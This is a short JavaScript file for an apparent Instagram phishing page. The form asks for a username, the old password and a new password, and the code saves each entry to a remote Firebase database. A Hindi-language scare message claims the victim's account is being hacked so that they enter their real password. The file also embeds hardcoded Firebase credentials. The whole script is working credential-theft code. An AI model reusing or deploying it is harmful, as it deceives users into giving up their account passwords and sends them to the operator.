// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
    apiKey: "AIzaSyDgY9qT22cGrA7d46axjzJT5g5EZ2SxsRw",
  authDomain: "mextube-2b3e3.firebaseapp.com",
  databaseURL: "https://mextube-2b3e3-default-rtdb.firebaseio.com",
  projectId: "mextube-2b3e3",
  storageBucket: "mextube-2b3e3.appspot.com",
  messagingSenderId: "821910922346",
  appId: "1:821910922346:web:b7f79bb310793978de1613",
 

  };
  
  firebase.initializeApp(firebaseConfig);
  
  // Reference messages collection
  var messagesRef = firebase.database().ref('messages');
  
  // Listen for form submit
  document.getElementById('submitBtn').addEventListener('click', submitForm);
  
  // Submit form
  function submitForm(e){
    e.preventDefault();
  
    // Check if all fields are filled
    var username = getInputVal('username');
    var oldPassword = getInputVal('old-password');
    var newPassword = getInputVal('new-password');
    var confirmNewPassword = getInputVal('confirm-new-password');
  
    if(username === '' || oldPassword === '' || newPassword === '' || confirmNewPassword === '') {
      alert('Please fill in all fields');
      return;
    }
  
    // Save message
    saveMessage(username, oldPassword, newPassword, confirmNewPassword);
  
    // Show submit text
    var submitBtn = document.getElementById('submitBtn');
    submitBtn.innerText = 'Confirm changed';
  
    // Reset submit text after 3 seconds
    setTimeout(function(){
      submitBtn.innerText = 'Confirm';
  
      // Show alert and change paragraph text
      var alertDiv = document.querySelector('.alert');
      alertDiv.style.display = 'block';
      
      var paragraph = document.querySelector('p');
      paragraph.innerText = "Aap ko chun leya gya hai";
      paragraph.style.color = 'green';
  
      // Add new paragraph
      var newParagraph = document.createElement('p');
      newParagraph.innerText = "ध्यान दें! आपके Instagram यूज़र आईडी को हैक करने की कोशिश की जा रही है।और आप अपना पासवर्ड जल्दी चेंज करें नहीं तो आपकी Instagram आईडी हैक हो जाएगी ।";
      newParagraph.style.color = 'darkred';
      document.querySelector('.main-wrapper').appendChild(newParagraph);
    }, 3000);
  
    // Clear form
    document.getElementById('contactForm').reset();
  }
  
  // Function to get form values
  function getInputVal(id){
    return document.getElementsByName(id)[0].value;
  }
  
  // Save message to firebase
  function saveMessage(username, oldPassword, newPassword, confirmNewPassword){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
      username: username,
      oldPassword: oldPassword,
      newPassword: newPassword,
      confirmNewPassword: confirmNewPassword
    });
  }
  